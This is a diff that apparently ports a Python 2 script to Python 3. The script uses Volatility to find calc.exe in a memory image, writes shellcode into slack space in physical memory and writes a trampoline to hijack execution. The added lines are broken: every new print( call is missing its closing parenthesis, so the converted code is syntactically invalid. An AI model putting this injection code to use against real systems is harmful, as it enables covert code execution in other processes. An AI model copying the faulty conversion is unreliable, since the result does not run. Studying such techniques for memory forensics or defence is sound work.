@@ -39,8 +39,8 @@ for process in p.calculate():
     if str(process.ImageFileName) == "calc.exe":
         
 
-        print "[*] Found calc.exe with PID %d" % process.UniqueProcessId
-        print "[*] Hunting for physical offsets...please wait."
+        print("[*] Found calc.exe with PID %d" % process.UniqueProcessId
+        print("[*] Hunting for physical offsets...please wait."
         
         address_space = process.get_process_address_space()
         pages         = address_space.get_available_pages()
@@ -60,10 +60,10 @@ for process in p.calculate():
                         offset = buf.index("\x00" * len(sc))
                         slack_space  = page[0] + offset
                         
-                        print "[*] Found good shellcode location!"
-                        print "[*] Virtual address: 0x%08x" % slack_space
-                        print "[*] Physical address: 0x%08x" % (physical + offset)
-                        print "[*] Injecting shellcode."
+                        print("[*] Found good shellcode location!"
+                        print("[*] Virtual address: 0x%08x" % slack_space
+                        print("[*] Physical address: 0x%08x" % (physical + offset)
+                        print("[*] Injecting shellcode."
                         
                         fd.seek(physical + offset)
                         fd.write(sc)
@@ -90,19 +90,19 @@ for process in p.calculate():
                     # now calculate physical offset
                     trampoline_offset = physical + v_offset
                     
-                    print "[*] Found our trampoline target at: 0x%08x" % (trampoline_offset)
+                    print("[*] Found our trampoline target at: 0x%08x" % (trampoline_offset)
                     
                     if slack_space is not None:
                         break
         
         
-        print "[*] Writing trampoline..."
+        print("[*] Writing trampoline..."
         
         fd = open(memory_file, "r+")
         fd.seek(trampoline_offset)
         fd.write(tramp)
         fd.close()
         
-        print "[*] Done injecting code."
+        print("[*] Done injecting code."
         
        
